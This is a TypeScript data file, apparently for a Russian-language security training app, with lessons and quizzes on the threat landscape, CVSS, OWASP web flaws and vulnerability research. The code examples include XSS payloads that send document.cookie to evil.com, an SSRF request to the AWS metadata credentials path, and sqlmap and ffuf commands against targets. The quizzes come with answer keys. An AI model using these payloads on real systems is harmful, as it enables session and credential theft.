import type { Module } from '../../types'

export const modules: Module[] = [
  // ── MODULE 1 ────────────────────────────────────────────────────────────
  {
    id: 'mod-01',
    title: 'Основы ИБ',
    subtitle: 'Threat Landscape',
    description:
      'Фундамент кибербезопасности: классификация угроз, CVE/CVSS, триада CIA. ' +
      'Без этого нельзя двигаться дальше.',
    icon: '🛡',
    color: '#ff0030',
    xpReward: 200,
    estimatedTime: '~40 мин',
    prerequisites: [],
    tags: ['theory', 'basics', 'CVE'],
    theory: [
      {
        id: 'sec-1-1',
        title: 'Ландшафт угроз',
        keyPoints: [
          'Угрозы делятся на: внешние / внутренние, целенаправленные / массовые',
          'APT (Advanced Persistent Threat) — длительные, скрытые атаки на конкретные цели',
          'Threat actors: хакеры-одиночки, киберпреступные группы, государственные акторы',
          'Kill Chain — модель: разведка → вооружение → доставка → эксплойт → инсталляция → C2 → цель'
        ],
        content: `Мир кибербезопасности начинается с понимания того, кто и почему атакует.

**Типы угроз**
Угрозы классифицируют по источнику, мотивации и методу. Внешние атаки исходят от людей вне организации — хакеров, криминальных группировок, государств. Внутренние — от сотрудников, подрядчиков, инсайдеров.

**APT — продвинутые устойчивые угрозы**
APT-группы (Lazarus, Cozy Bear, Fancy Bear) — это профессиональные команды, которые месяцами живут в инфраструктуре жертвы незамеченными. Касперский активно исследует и атрибутирует такие группы.

**Cyber Kill Chain**
Модель Lockheed Martin описывает 7 стадий атаки:
1. Reconnaissance — сбор информации о цели
2. Weaponization — создание вредоносного инструмента
3. Delivery — доставка (email, USB, веб)
4. Exploitation — использование уязвимости
5. Installation — закрепление в системе
6. Command & Control — связь с C2-сервером
7. Actions on Objectives — кража данных / шифрование

**MITRE ATT&CK**
Фреймворк с сотнями реальных техник, используемых атакующими. Обязательный инструмент для любого исследователя безопасности.`,
        codeExample: `# Пример: поиск IoC (Indicator of Compromise) в логах
grep -rn "185.234.218.\\|cobalt strike\\|mimikatz" /var/log/
# Хэши известных малварей можно проверить на VirusTotal API
curl "https://www.virustotal.com/vtapi/v2/file/report?apikey=KEY&resource=HASH"`
      },
      {
        id: 'sec-1-2',
        title: 'CVE и CVSS — язык уязвимостей',
        keyPoints: [
          'CVE — уникальный идентификатор уязвимости: CVE-YYYY-NNNNN',
          'CVSS v3.1 — числовой балл от 0.0 до 10.0 (критичность)',
          'Вектор CVSS учитывает: AV (attack vector), AC, PR, UI, S, C, I, A',
          'NVD и Vulners — публичные базы CVE с описаниями и патчами'
        ],
        content: `**CVE (Common Vulnerabilities and Exposures)**
Каждая публично известная уязвимость получает CVE-идентификатор. Например, знаменитый EternalBlue — это CVE-2017-0144.

**CVSS — числовая оценка критичности**
CVSS (Common Vulnerability Scoring System) позволяет быстро понять, насколько опасна уязвимость:

| Балл      | Уровень  |
|-----------|----------|
| 0.1 – 3.9 | Low      |
| 4.0 – 6.9 | Medium   |
| 7.0 – 8.9 | High     |
| 9.0 – 10  | Critical |

**Метрики вектора (пример)**
\`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\`
- AV:N — атака по сети (Network)
- AC:L — низкая сложность (Low Complexity)
- PR:N — не нужны привилегии (No Privileges Required)
- Итог: Critical 9.8

**Почему это важно для исследователя**
Когда ты находишь уязвимость, именно CVSS определяет её ценность для bug bounty программы или ответственного раскрытия.`,
        codeExample: `# Поиск CVE по продукту через API
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=OpenSSL+heap+overflow"

# Просмотр деталей конкретной CVE
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228"`
      },
      {
        id: 'sec-1-3',
        title: 'Триада CIA и модели безопасности',
        keyPoints: [
          'CIA: Confidentiality (конфиденциальность), Integrity (целостность), Availability (доступность)',
          'Атаки нарушают одну или несколько составляющих CIA',
          'Zero Trust: "никогда не доверяй, всегда проверяй"',
          'Defence in Depth — многоуровневая защита'
        ],
        content: `**Триада CIA — основа основ**
Любую угрозу можно описать через то, что она нарушает:

🔒 **Confidentiality** — утечка данных, перехват трафика, инсайдерские угрозы
✏️  **Integrity** — подмена данных, SQL-инъекции, атаки на цепочку поставок
⚡ **Availability** — DDoS, ransomware, уничтожение данных

**Модели управления доступом**
- **DAC** (Discretionary) — владелец ресурса сам назначает права (классический файловый ACL)
- **MAC** (Mandatory) — метки секретности, используется в военных системах
- **RBAC** (Role-Based) — права назначаются через роли (самая распространённая модель)
- **ABAC** (Attribute-Based) — решение принимается на основе атрибутов пользователя и ресурса

**Zero Trust Architecture**
Современная парадигма: не доверяй ни одному запросу по умолчанию, даже внутри сети. Проверяй identity, device health, context при каждом обращении.

**Defence in Depth**
Никогда не полагайся на одну линию защиты. Файрвол взломали? Должна сработать сегментация сети. Её обошли? SIEM заметит аномалию.`,
        codeExample: `# Проверка целостности файла (Integrity)
sha256sum /bin/ls
# Сравнение с доверенным хэшем
echo "expected_hash  /bin/ls" | sha256sum --check

# Пример RBAC в Linux — проверка sudo-правил
sudo -l -U username`
      }
    ],
    quiz: [
      {
        id: 'q1-1',
        question: 'Что такое APT (Advanced Persistent Threat)?',
        options: [
          'Тип DDoS-атаки с использованием ботнета',
          'Длительная целенаправленная атака, скрытая от обнаружения',
          'Уязвимость нулевого дня в сетевых протоколах',
          'Метод шифрования данных в ransomware'
        ],
        correctIndex: 1,
        explanation:
          'APT — это продолжительная атака (месяцы/годы), направленная на конкретную цель. Государственные группировки (Lazarus, Cozy Bear) — типичные примеры. Цель — тихо собирать информацию, а не привлекать внимание.',
        difficulty: 'easy'
      },
      {
        id: 'q1-2',
        question: 'CVSS-балл 9.8 соответствует какому уровню критичности?',
        options: ['High', 'Medium', 'Critical', 'Low'],
        correctIndex: 2,
        explanation:
          'Уязвимости с баллом ≥9.0 по CVSS считаются Critical. 9.8 — один из самых высоких баллов. Пример: Log4Shell (CVE-2021-44228) получил 10.0.',
        difficulty: 'easy'
      },
      {
        id: 'q1-3',
        question: 'На какой стадии Kill Chain атакующий закрепляется в системе (persistence)?',
        options: ['Delivery', 'Exploitation', 'Installation', 'Reconnaissance'],
        correctIndex: 2,
        explanation:
          'Installation — стадия закрепления. Атакующий устанавливает бэкдор, модифицирует автозагрузку или создаёт задачу в планировщике, чтобы пережить перезагрузку.',
        difficulty: 'medium'
      },
      {
        id: 'q1-4',
        question:
          'Вектор CVSS: AV:N/AC:L/PR:N/UI:N. Что означает AV:N?',
        options: [
          'Атака требует физического доступа',
          'Атака возможна через соседнюю сеть',
          'Атака возможна удалённо через интернет',
          'Атака возможна только локально'
        ],
        correctIndex: 2,
        explanation:
          'AV:N (Attack Vector: Network) означает, что уязвимость эксплуатируется удалённо через сеть — самый опасный вектор. AV:L — локально, AV:P — физически.',
        difficulty: 'medium'
      },
      {
        id: 'q1-5',
        question: 'Ransomware нарушает какой компонент триады CIA?',
        options: [
          'Только Confidentiality',
          'Только Integrity',
          'Availability (и часто Confidentiality)',
          'Только Integrity и Confidentiality'
        ],
        correctIndex: 2,
        explanation:
          'Ransomware шифрует файлы → нарушает Availability (данные недоступны). Современные ransomware-группы также крадут данные перед шифрованием → нарушают Confidentiality (двойное вымогательство).',
        difficulty: 'medium'
      }
    ]
  },

  // ── MODULE 2 ────────────────────────────────────────────────────────────
  {
    id: 'mod-02',
    title: 'Веб-безопасность',
    subtitle: 'OWASP Top 10',
    description:
      'XSS, SQL Injection, IDOR, SSRF и другие классические веб-уязвимости. ' +
      'Обязательная база для любого, кто хочет работать в ИБ.',
    icon: '🕸',
    color: '#cc0025',
    xpReward: 250,
    estimatedTime: '~55 мин',
    prerequisites: ['mod-01'],
    tags: ['web', 'OWASP', 'XSS', 'SQLi'],
    theory: [
      {
        id: 'sec-2-1',
        title: 'OWASP Top 10 — обзор',
        keyPoints: [
          'OWASP Top 10 — список наиболее критических веб-уязвимостей',
          'A01: Broken Access Control — самая распространённая в 2023',
          'A03: Injection — SQL, NoSQL, LDAP, OS-инъекции',
          'A07: Identification & Authentication Failures — слабая аутентификация'
        ],
        content: `**OWASP (Open Web Application Security Project)**
Некоммерческая организация, которая выпускает руководства и инструменты для безопасности ПО. Их Top 10 — стандарт индустрии.

**OWASP Top 10 (2021)**
| # | Название | Примеры |
|---|----------|---------|
| A01 | Broken Access Control | IDOR, privilege escalation |
| A02 | Cryptographic Failures | слабое шифрование, plaintext |
| A03 | Injection | SQL, XSS, command injection |
| A04 | Insecure Design | отсутствие rate limiting |
| A05 | Security Misconfiguration | открытые S3, дефолтные пароли |
| A06 | Vulnerable Components | устаревшие библиотеки |
| A07 | Auth Failures | слабые пароли, session fixation |
| A08 | Software & Data Integrity | unsigned updates |
| A09 | Logging Failures | нет логов атак |
| A10 | SSRF | запросы к внутренней инфраструктуре |

**Связь с твоим опытом**
Из Code4rena аудитов ты знаешь reentrancy и flash loan атаки в Solidity. Они аналогичны TOCTOU (Time-Of-Check/Time-Of-Use) уязвимостям в веб.`,
        codeExample: `# Инструмент автоматического сканирования OWASP Top 10
# Nikto — базовый веб-сканер
nikto -h https://target.example.com

# OWASP ZAP — full proxy + scanner (GUI и CLI)
zap-cli quick-scan --self-contained -t https://target.example.com`
      },
      {
        id: 'sec-2-2',
        title: 'XSS и Injection-атаки',
        keyPoints: [
          'XSS (Cross-Site Scripting): reflected, stored, DOM-based',
          'Stored XSS опаснее всего — payload хранится на сервере',
          'SQL Injection: классический, blind, time-based, out-of-band',
          'Защита: параметризованные запросы, Content Security Policy (CSP)'
        ],
        content: `**Cross-Site Scripting (XSS)**
XSS позволяет атакующему внедрить JavaScript-код, который выполнится в браузере жертвы.

**Типы XSS:**
🔴 **Reflected** — payload в URL, выполняется при переходе по ссылке
🔴 **Stored** — payload сохраняется в БД (комментарии, профиль), атакует всех посетителей
🔴 **DOM-based** — JavaScript сам модифицирует DOM без запроса к серверу

**Что делает XSS?**
- Кража cookies / session tokens
- Keylogger — запись нажатий клавиш
- Redirect на фишинговый сайт
- BeEF (Browser Exploitation Framework) — полный контроль браузера

**SQL Injection**
Если пользовательский ввод попадает в SQL-запрос без валидации — катастрофа.

\`SELECT * FROM users WHERE name='$input'\`

При вводе \`' OR 1=1 --\` запрос становится: \`SELECT * FROM users WHERE name='' OR 1=1 --'\`
Результат: все записи таблицы.

**Защита:**
✅ Prepared statements / parameterized queries
✅ ORM-фреймворки (Hibernate, SQLAlchemy)
✅ WAF (Web Application Firewall)
✅ Input validation + output encoding`,
        codeExample: `// Уязвимый код (PHP)
$query = "SELECT * FROM users WHERE id=" . $_GET['id'];

// Безопасный код (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);

// Базовый XSS payload
<script>document.location='https://evil.com/?c='+document.cookie</script>

// sqlmap — автоматизация SQLi (только в лаборатории!)
sqlmap -u "https://target.com/page?id=1" --dbs`
      },
      {
        id: 'sec-2-3',
        title: 'IDOR, SSRF и Broken Access Control',
        keyPoints: [
          'IDOR: подмена ID объекта для доступа к чужим данным',
          'SSRF: сервер делает запросы к внутренней инфраструктуре',
          'Horizontal vs Vertical privilege escalation',
          'SSRF → AWS metadata (169.254.169.254) → утечка ролей IAM'
        ],
        content: `**IDOR (Insecure Direct Object Reference)**
Классика bug bounty. Пользователь меняет ID в запросе и получает чужие данные.

\`GET /api/orders/12345\` → меняем на \`GET /api/orders/12346\`
Если сервер не проверяет принадлежность — IDOR.

**Где искать IDOR:**
- API endpoints с числовыми/UUID идентификаторами
- Параметры типа \`user_id\`, \`account\`, \`doc_id\`
- GraphQL queries с предсказуемыми ID

**SSRF (Server-Side Request Forgery)**
Заставляем сервер делать HTTP-запросы вместо нас — к внутренней сети, к которой у нас нет доступа.

\`POST /fetch?url=http://internal-service:8080/admin\`

**Критический кейс — AWS metadata:**
\`url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\`
→ Получаем AWS-ключи роли EC2-инстанса → полный контроль над облаком.

**Privilege Escalation:**
- Horizontal: доступ к ресурсам другого пользователя того же уровня
- Vertical: повышение привилегий (user → admin)`,
        codeExample: `# Проверка SSRF вручную — используем Burp Collaborator / interactsh
curl -X POST "https://target.com/api/webhook" \\
  -d '{"url":"https://your-interactsh-server.com/ssrf-test"}'

# Автоматический поиск IDOR с ffuf
ffuf -u "https://target.com/api/user/FUZZ" \\
  -w ids.txt \\
  -H "Cookie: session=your_session" \\
  -fc 403,404`
      }
    ],
    quiz: [
      {
        id: 'q2-1',
        question: 'Чем Stored XSS опаснее Reflected XSS?',
        options: [
          'Stored XSS работает только в Internet Explorer',
          'Stored XSS автоматически атакует всех посетителей страницы',
          'Reflected XSS требует авторизации, Stored — нет',
          'Разницы нет, оба одинаково опасны'
        ],
        correctIndex: 1,
        explanation:
          'Stored XSS хранится в базе данных и выполняется при каждом посещении заражённой страницы. Один payload → тысячи жертв. Reflected требует, чтобы каждая жертва перешла по специально созданной ссылке.',
        difficulty: 'easy'
      },
      {
        id: 'q2-2',
        question: 'Какой запрос демонстрирует IDOR-атаку?',
        options: [
          'GET /admin после брутфорса пароля',
          "GET /api/orders/1337 при авторизации как пользователь с ID=999",
          'POST /login с payload: admin\' OR 1=1 --',
          'GET / с заголовком X-Forwarded-For: 127.0.0.1'
        ],
        correctIndex: 1,
        explanation:
          'IDOR — это когда ты подменяешь идентификатор объекта и получаешь доступ к чужим данным. Запрос к orders/1337 от пользователя 999 — типичный IDOR, если сервер не проверяет владельца заказа.',
        difficulty: 'easy'
      },
      {
        id: 'q2-3',
        question: 'Что защищает от SQL Injection лучше всего?',
        options: [
          'Экранирование одиночных кавычек',
          'Параметризованные запросы (prepared statements)',
          'Проверка длины строки',
          'Использование POST вместо GET'
        ],
        correctIndex: 1,
        explanation:
          'Prepared statements разделяют код и данные на уровне протокола — пользовательский ввод никогда не интерпретируется как SQL. Экранирование кавычек ненадёжно и легко обойти.',
        difficulty: 'medium'
      },
      {
        id: 'q2-4',
        question: 'SSRF к адресу 169.254.169.254 в облачной среде (AWS/GCP) даёт что?',
        options: [
          'Доступ к DNS-серверу провайдера',
          'Подключение к внутренней базе данных',
          'Доступ к metadata-сервису — ключам IAM / сервисным аккаунтам',
          'Соединение с gateway самого EC2-инстанса'
        ],
        correctIndex: 2,
        explanation:
          '169.254.169.254 — это link-local адрес instance metadata service в AWS/GCP/Azure. Через SSRF можно получить временные IAM-ключи, user-data, теги. Это один из самых ценных SSRF-векторов в cloud-окружениях.',
        difficulty: 'hard'
      },
      {
        id: 'q2-5',
        question: 'Vertical privilege escalation — это:',
        options: [
          'Доступ к аккаунту другого пользователя того же уровня',
          'Повышение привилегий: обычный пользователь получает права администратора',
          'Атака на сетевой уровень модели OSI',
          'Эксплуатация уязвимости в вертикальном scroll-bar'
        ],
        correctIndex: 1,
        explanation:
          'Vertical escalation — пересечение границ привилегий (user → admin, guest → moderator). Horizontal — доступ к чужим ресурсам на своём уровне (user_A → данные user_B).',
        difficulty: 'medium'
      }
    ]
  },

  // ── MODULE 3 ────────────────────────────────────────────────────────────
  {
    id: 'mod-03',
    title: 'Исследование уязвимостей',
    subtitle: 'Vuln Research & PoC',
    description:
      'Методология поиска уязвимостей, разработка PoC, Bug Bounty, ответственное раскрытие. ' +
      'Здесь твои навыки из Code4rena напрямую применимы.',
    icon: '🔬',
    color: '#aa0020',
    xpReward: 300,
    estimatedTime: '~60 мин',
    prerequisites: ['mod-02'],
    tags: ['research', 'PoC', 'bug-bounty', 'audit'],
    theory: [
      {
        id: 'sec-3-1',
        title: 'Методология поиска уязвимостей',
        keyPoints: [
          'Black box / Grey box / White box — три модели тестирования',
          'Threat modeling: STRIDE и Attack Trees',
          'Фаззинг (fuzzing) — автоматическая генерация некорректного ввода',
          'Code Review: ручной анализ — самый эффективный метод'
        ],
        content: `**Три модели тестирования**

🖤 **Black box** — нет доступа к исходному коду, как реальный атакующий.
⚫ **Grey box** — частичная информация (архитектура, API-схема).
🔳 **White box** — полный доступ к коду, документации, окружению. Максимально эффективен.

Твои Code4rena аудиты — это white box. В Касперском большинство исследований тоже white box.

**Threat Modeling — STRIDE**
Систематическая методология поиска угроз:
- **S**poofing — подделка identity
- **T**ampering — модификация данных
- **R**epudiation — отрицание действий
- **I**nformation disclosure — утечка
- **D**enial of Service — отказ в обслуживании
- **E**levation of privilege — повышение привилегий

**Fuzzing**
Автоматическая генерация случайных/граничных данных на вход программы. Цель — вызвать краш (= потенциальная уязвимость).

Инструменты: AFL++, libFuzzer, Boofuzz (сетевые протоколы).

**Code Review**
Лучший метод для глубоких уязвимостей. Ищи:
- Небезопасные функции (strcpy, gets, sprintf в C)
- Проверку аргументов после их использования
- Целочисленные переполнения
- Race conditions`,
        codeExample: `# AFL++ — coverage-guided fuzzer
afl-fuzz -i input_corpus -o findings -- ./target_binary @@

# libFuzzer (для C/C++ программ)
# target_fuzz.cpp:
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    parse_input(data, size);  // функция которую фаззим
    return 0;
}
clang -fsanitize=fuzzer,address target_fuzz.cpp -o fuzzer
./fuzzer -max_total_time=3600`
      },
      {
        id: 'sec-3-2',
        title: 'Разработка Proof of Concept',
        keyPoints: [
          'PoC доказывает реальную эксплуатируемость уязвимости',
          'Надёжный PoC = максимальный выплата за баг',
          'Для бинарных уязвимостей: exploit = контроль RIP/EIP + payload',
          'Из твоего опыта: PoC в Foundry = PoC для бинарных уязвимостей'
        ],
        content: `**Зачем нужен PoC?**
Найти уязвимость — полдела. Нужно доказать, что она реально эксплуатируется. PoC (Proof of Concept) — это минимальный рабочий эксплойт.

В bug bounty: без PoC репорт получает низкий приоритет. С PoC — максимальный.

**Твои навыки из Code4rena**
В Foundry ты пишешь тесты вида:
\`\`\`solidity
function testExploit() public {
    // Setup
    vm.deal(attacker, 100 ether);
    // Attack
    Exploit exploit = new Exploit(address(target));
    exploit.run();
    // Assert profit
    assertGt(attacker.balance, 1000 ether);
}
\`\`\`
Структура **идентична** классическому security PoC:
1. Setup — подготовка окружения
2. Trigger — эксплуатация
3. Assert — доказательство импакта

**PoC для веб-уязвимости**
\`\`\`
1. Минимальный HTTP-запрос, воспроизводящий баг
2. Скриншот / видео доказательство
3. Описание импакта (что реально можно сделать)
\`\`\`

**Quality PoC checklist:**
✅ Воспроизводится с первого раза
✅ Минимальный — без лишнего кода
✅ Чёткий impact statement
✅ Tested on latest version`,
        codeExample: `# Пример структуры PoC репорта для веб-уязвимости

## Title
Stored XSS in /profile/bio — cookie theft possible

## Steps to reproduce
1. Login as any user
2. Navigate to /settings/profile
3. In "Bio" field, enter: <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
4. Save profile
5. Open profile page in another browser / incognito
6. Observe request to evil.com with victim's session cookie

## Impact
Attacker can steal session tokens of ALL users who view the profile.
Full account takeover possible.

## CVSS: 8.8 (High)
AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`
      },
      {
        id: 'sec-3-3',
        title: 'Bug Bounty и ответственное раскрытие',
        keyPoints: [
          'Bug Bounty: HackerOne, Bugcrowd, Intigriti — топ-платформы',
          'Responsible Disclosure: уведомить вендора до публичного раскрытия',
          'CVD (Coordinated Vulnerability Disclosure) — стандарт ISO 29147',
          'Касперский: bug bounty программа + own research team'
        ],
        content: `**Bug Bounty — монетизация навыков**
Компании платят за найденные уязвимости. Топ выплаты:
- Google: до $31 000 за Chrome RCE
- Microsoft: до $250 000 за Hyper-V RCE
- HackerOne Hall of Fame — репутация в сообществе

**Как начать?**
1. Зарегистрируйся на HackerOne / Bugcrowd
2. Ищи программы с broad scope (wildcard *.target.com)
3. Начни с простых: IDOR, информационное раскрытие
4. Постепенно переходи к сложным

**Responsible Disclosure (Ответственное раскрытие)**
Это этический стандарт:
1. Найди уязвимость
2. Уведоми вендора (security@company.com)
3. Дай разумное время на исправление (90 дней — стандарт Google Project Zero)
4. Только после патча — публикуй

**Почему это важно для Касперского**
Каспер активно изучает уязвимости и публикует исследования (GReAT team). Навык ответственного раскрытия = понимание процессов координации между командами.

**Full Disclosure vs Responsible Disclosure**
Full Disclosure — публикация сразу, без уведомления вендора. Спорно этически, но иногда применяется если вендор игнорирует проблему дольше 90 дней.`,
        codeExample: `# Шаблон письма вендору (responsible disclosure)

Subject: [Security] Stored XSS Vulnerability in User Profiles

Hello Security Team,

I've discovered a Stored XSS vulnerability in your application
that allows an attacker to steal session cookies of any user.

Affected endpoint: POST /api/profile/update
Parameter: bio
Severity: High (CVSS 8.8)

Proof of Concept: [PoC attached / described below]

I'm following responsible disclosure and will keep this
confidential for 90 days from the date of this report.

Best regards,
[Your Name]`
      }
    ],
    quiz: [
      {
        id: 'q3-1',
        question: 'Что такое White Box тестирование?',
        options: [
          'Тестирование без авторизации в приложении',
          'Тестирование с полным доступом к исходному коду и архитектуре',
          'Тестирование только интерфейса без доступа к API',
          'Автоматизированное сканирование с помощью инструментов'
        ],
        correctIndex: 1,
        explanation:
          'White box даёт максимальный контекст: исходный код, схемы БД, конфигурации. Code4rena аудиты — это white box. Именно этот подход Касперский использует в своих deep-dive исследованиях.',
        difficulty: 'easy'
      },
      {
        id: 'q3-2',
        question: 'Что означает буква "T" в модели STRIDE?',
        options: ['Trust', 'Tampering', 'Tracing', 'Tunneling'],
        correctIndex: 1,
        explanation:
          'STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. Tampering — модификация данных без авторизации.',
        difficulty: 'medium'
      },
      {
        id: 'q3-3',
        question: 'Стандартный срок ответственного раскрытия (согласно Google Project Zero) — это:',
        options: ['30 дней', '60 дней', '90 дней', '180 дней'],
        correctIndex: 2,
        explanation:
          'Google Project Zero установил стандарт в 90 дней. После 90 дней без патча — уязвимость публикуется. Это создаёт давление на вендоров и является компромиссом между публичной безопасностью и временем на исправление.',
        difficulty: 'easy'
      },
      {
        id: 'q3-4',
        question: 'Fuzzing — это:',
        options: [
          'Ручной анализ исходного кода на наличие уязвимостей',
          'Атака методом перебора паролей',
          'Автоматическая генерация случайных входных данных для поиска сбоев',
          'Анализ сетевого трафика с помощью Wireshark'
        ],
        correctIndex: 2,
        explanation:
          'Fuzzing отправляет программе случайные, некорректные или граничные данные и ищет краши. Краш = потенциальная уязвимость (buffer overflow, use-after-free, etc). AFL++ и libFuzzer — ведущие инструменты.',
        difficulty: 'medium'
      },
      {
        id: 'q3-5',
        question: 'Чем твой PoC в Foundry (testExploit) похож на PoC для классической уязвимости?',
        options: [
          'Ничем — это принципиально разные концепции',
          'Только тем что оба используют assert',
          'Структурой: setup окружения → триггер атаки → доказательство импакта',
          'Только языком программирования — оба используют C'
        ],
        correctIndex: 2,
        explanation:
          'Структура любого PoC универсальна: настройка окружения, выполнение атаки, верификация результата. Твои Foundry-тесты — это уже security PoC, просто в контексте EVM. Этот навык переносится напрямую.',
        difficulty: 'medium'
      }
    ]
  },

  // ── MODULE 4 ────────────────────────────────────────────────────────────
  {
    id: 'mod-04',
    title: 'Сетевая безопасность',
    subtitle: 'Network Security',
    description:
      'TCP/IP стек, анализ трафика, атаки на сетевом уровне. Wireshark, Nmap, Scapy.',
    icon: '📡',
    color: '#880018',
    xpReward: 280,
    estimatedTime: '~50 мин',
    prerequisites: ['mod-02'],
    tags: ['network', 'TCP/IP', 'Wireshark', 'scanning'],
    theory: [],
    quiz: []
  },

  // ── MODULE 5 ────────────────────────────────────────────────────────────
  {
    id: 'mod-05',
    title: 'Анализ малвари',
    subtitle: 'Malware Analysis',
    description:
      'Статический и динамический анализ вредоносного ПО. PE-формат, IDA/Ghidra, поведенческий анализ.',
    icon: '🦠',
    color: '#660012',
    xpReward: 400,
    estimatedTime: '~90 мин',
    prerequisites: ['mod-04'],
    tags: ['malware', 'reverse', 'IDA', 'sandbox'],
    theory: [],
    quiz: []
  },

  // ── MODULE 6 ────────────────────────────────────────────────────────────
  {
    id: 'mod-06',
    title: 'Реверс-инжиниринг',
    subtitle: 'Reverse Engineering',
    description:
      'x86/x64 ассемблер, разборка бинарных файлов, патчинг, CTF challenges.',
    icon: '⚙️',
    color: '#440008',
    xpReward: 500,
    estimatedTime: '~120 мин',
    prerequisites: ['mod-05'],
    tags: ['reverse', 'assembly', 'x64', 'CTF'],
    theory: [],
    quiz: []
  }
]
